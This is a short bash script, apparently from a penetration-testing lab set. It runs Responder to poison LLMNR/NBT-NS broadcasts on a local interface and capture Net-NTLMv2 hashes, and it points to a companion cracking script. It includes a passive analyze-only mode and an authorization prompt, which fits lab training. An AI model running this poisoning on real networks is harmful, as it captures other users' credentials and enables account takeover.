#!/usr/bin/env bash
# LLMNR / NBT-NS poisoning with Responder.
# Mirrors: LLMNR-NBT-NS-Poisoning.md and lab-walkthrough.md
#
# Starts Responder on a given interface so it answers LLMNR/NBT-NS broadcasts and
# captures Net-NTLMv2 hashes into its log tree. Analyze-only mode (-A) is offered
# first so you can watch the broadcasts without answering them.

cd "$(dirname "$0")"
source ./lib.sh

IFACE=""
ANALYZE=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    -i|--interface) IFACE="${2:-}"; shift 2 ;;
    -A|--analyze)   ANALYZE=1; shift ;;
    -h|--help)      usage_and_exit "$0 -i <interface> [-A]   (-A = passive analyze-only, no poisoning)" ;;
    *)              usage_and_exit "$0 -i <interface> [-A]" ;;
  esac
done

[[ -n "$IFACE" ]] || usage_and_exit "$0 -i <interface> [-A]"
need responder

if [[ "$ANALYZE" == "1" ]]; then
  info "Analyze-only: watching LLMNR/NBT-NS broadcasts on '$IFACE' without answering."
  run sudo responder -I "$IFACE" -A
else
  authorize "the local subnet on interface '$IFACE'"
  info "Poisoning LLMNR/NBT-NS on '$IFACE'. Captured hashes land under Responder's logs/ dir."
  info "Crack what you capture with ./02-crack-ntlmv2.sh"
  run sudo responder -I "$IFACE"
fi
